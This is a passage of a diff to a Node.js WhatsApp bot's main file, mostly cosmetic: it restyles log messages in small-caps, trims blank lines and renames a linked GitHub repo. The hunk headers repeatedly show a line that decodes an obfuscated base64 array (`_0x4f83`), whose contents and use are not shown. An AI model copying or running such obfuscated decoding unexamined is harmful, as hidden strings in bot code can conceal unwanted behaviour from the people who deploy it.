'🐣', '🐥', '🦄', '🐯', '🐦', '🐬', '🐋', '🦆', '💈', '⛲', '⛩️', '🎈', '🎋', '🪀', '🧩', '👾', '💸', '💎', '🧮', '👒', '🧢', '🎀', '🧸', '👑', '〽️', '😳', '💀', '☠️', '👻', '🔥', '♥️', '👀', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'];
           const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
           m.react(randomReaction);
         }
       }
 
       if (!isReact && config.CUSTOM_REACT === 'true') {
-
         const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
         const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
         m.react(randomReaction);
@@ -489,7 +512,6 @@ const loveterri = _0x4f83.map(x => Buffer.from(x, 'base64').toString('utf-8'));
 
       const isFileOwner = ownerFile.includes(sender);
       const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
-      // اعمال شرایط بر اساس وضعیت مالک
       if (!isRealOwner && config.MODE === "private") return;
       if (!isRealOwner && isGroup && config.MODE === "inbox") return;
       if (!isRealOwner && !isGroup && config.MODE === "groups") return;
@@ -504,7 +526,7 @@ const loveterri = _0x4f83.map(x => Buffer.from(x, 'base64').toString('utf-8'));
           try {
             cmd.function(conn, mek, m, { from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
           } catch (e) {
-            console.error("[PLUGIN ERROR] " + e);
+            console.error("[ᴘʟᴜɢɪɴ ᴇʀʀᴏʀ] " + e);
           }
         }
       }
@@ -527,7 +549,7 @@ const loveterri = _0x4f83.map(x => Buffer.from(x, 'base64').toString('utf-8'));
       });
 
     } catch (err) {
-      console.error('[messages.upsert handler error]', err);
+      console.error('[ᴍᴇssᴀɢᴇs.ᴜᴘsᴇʀᴛ ʜᴀɴᴅʟᴇʀ ᴇʀʀᴏʀ]', err);
     }
   });
 
@@ -634,7 +656,6 @@ const loveterri = _0x4f83.map(x => Buffer.from(x, 'base64').toString('utf-8'));
   }
 
   conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
-
     let mtype = Object.keys(copy.message)[0]
     let isEphemeral = mtype === 'ephemeralMessage'
     if (isEphemeral) {
@@ -662,7 +683,6 @@ const loveterri = _0x4f83.map(x => Buffer.from(x, 'base64').toString('utf-8'));
   conn.getFile = async (PATH, save) => {
     let res
     let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
-    //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
     let type = await fileTypeFromBuffer(data) || {
       mime: 'application/octet-stream',
       ext: '.bin'
@@ -676,7 +696,6 @@ const loveterri = _0x4f83.map(x => Buffer.from(x, 'base64').toString('utf-8'));
       ...type,
       data
     }
-
   }
 
   conn.sendFile = async (jid, PATH, fileName, quoted = {}, options = {}) => {
@@ -773,7 +792,6 @@ const loveterri = _0x4f83.map(x => Buffer.from(x, 'base64').toString('utf-8'));
     );
   };
 
-
   conn.sendTextWithMentions = async (jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
 
   conn.sendImage = async (jid, path, caption = '', quoted = '', options) => {
@@ -811,18 +829,13 @@ const loveterri = _0x4f83.map(x => Buffer.from(x, 'base64').toString('utf-8'));
 
   conn.getName = (jid, withoutContact = false) => {
     id = conn.decodeJid(jid);
-
     withoutContact = conn.withoutContact || withoutContact;
-
     let v;
-
     if (id.endsWith('@g.us'))
       return new Promise(async resolve => {
         v = store.contacts[id] || {};
-
         if (!(v.name && v.name.notify || v.subject))
           v = conn.groupMetadata(id) || {};
-
         resolve(
           v.name ||
           v.subject ||
@@ -835,13 +848,11 @@ const loveterri = _0x4f83.map(x => Buffer.from(x, 'base64').toString('utf-8'));
         id === '0@s.whatsapp.net'
           ? {
             id,
-
-            name: 'WhatsApp',
+            name: 'ᴡʜᴀᴛsᴀᴘᴘ',
           }
           : id === conn.decodeJid(conn.user.id)
             ? conn.user
             : store.contacts[id] || {};
-
     return (
       (withoutContact ? '' : v.name) ||
       v.subject ||
@@ -857,14 +868,14 @@ const loveterri = _0x4f83.map(x => Buffer.from(x, 'base64').toString('utf-8'));
         displayName: await conn.getName(i + '@s.whatsapp.net'),
         vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
           i + '@s.whatsapp.net',
-        )}\nFN:${global.OwnerName || ''}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${global.email || ''}\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${global.github || ''}/VERONICA-AI\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${global.location || ''};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
+        )}\nFN:${global.OwnerName || ''}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${global.email || ''}\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${global.github || ''}/QUEEN-PROSSIE\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${global.location || ''};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
       });
     }
     conn.sendMessage(
       jid,
       {
         contacts: {
-          displayName: `${list.length} Contact`,
+          displayName: `${list.length} ᴄᴏɴᴛᴀᴄᴛ`,
           contacts: list,
         },
         ...opts,
@@ -892,6 +903,8 @@ const loveterri = _0x4f83.map(x => Buffer.from(x, 'base64').toString('utf-8'));
     return status;
   };
   conn.serializeM = mek => sms(conn, mek, store);
+
+  return conn;
 }
 
 app.use(express.static(path.join(__dirname, 'lib')));
@@ -899,15 +912,17 @@ app.use(express.static(path.join(__dirname, 'lib')));
 app.get('/', (req, res) => {
   res.redirect('/t.html');
 });
+
 process.on("uncaughtException", (err) => {
-  console.error("[❗] Uncaught Exception:", err.stack || err);
+  console.error("[❗] ᴜɴᴄᴀᴜɢʜᴛ ᴇxᴄᴇᴘᴛɪᴏɴ:", err.stack || err);
 });
 
 process.on("unhandledRejection", (reason, p) => {
-  console.error("[❗] Unhandled Promise Rejection:", reason);
+  console.error("[❗] ᴜɴʜᴀɴᴅʟᴇᴅ ᴘʀᴏᴍɪsᴇ ʀᴇᴊᴇᴄᴛɪᴏɴ:", reason);
 });
 
-app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
+app.listen(port, () => console.log(`sᴇʀᴠᴇʀ ʟɪsᴛᴇɴɪɴɢ ᴏɴ ᴘᴏʀᴛ http://localhost:${port}`));
+
 setTimeout(() => {
   connectToWA()
 }, 4000);
